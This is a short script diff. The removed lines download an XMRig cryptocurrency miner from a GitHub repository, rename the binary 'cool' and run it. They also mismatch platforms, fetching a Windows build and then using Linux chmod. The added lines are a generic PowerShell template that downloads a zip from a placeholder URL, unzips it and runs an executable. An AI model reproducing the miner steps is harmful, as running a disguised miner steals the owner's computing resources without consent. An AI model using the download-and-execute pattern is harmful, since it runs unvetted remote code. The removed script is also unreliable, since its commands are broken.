@@ -1,8 +1,11 @@
-sudo apt install wget
-apt install wget
-wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrig-6.21.0-msvc-win64.zip
-unzip xmrig-6.21.0-msvc-win64.zip
-cd xmrig-6.21.0
-chmod +x xmrig
- mv xmrig cool
-./cool
+# Download the file
+Invoke-WebRequest -Uri "https://example.com/file.zip" -OutFile "file.zip"
+
+# Unzip the file
+Expand-Archive -Path "file.zip" -DestinationPath "./unzipped" -Force
+
+# Change directory
+Set-Location -Path "./unzipped"
+
+# Execute the file
+Start-Process -FilePath ".\yourfile.exe"
